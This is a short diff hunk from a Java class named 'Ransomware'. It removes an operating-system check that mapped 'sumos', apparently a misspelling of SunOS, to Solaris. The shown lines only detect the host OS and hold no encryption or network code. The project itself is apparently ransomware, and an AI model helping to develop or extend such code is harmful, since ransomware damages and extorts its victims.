@@ -143,8 +143,6 @@ public class Ransomware {
         os = os.LINUX;
       } else if(opSys.contains("mac")) {
         os = os.MAC;
-      } else if(opSys.contains("sumos")) {
-        os = os.SOLARIS;
       }
     }
     return os;
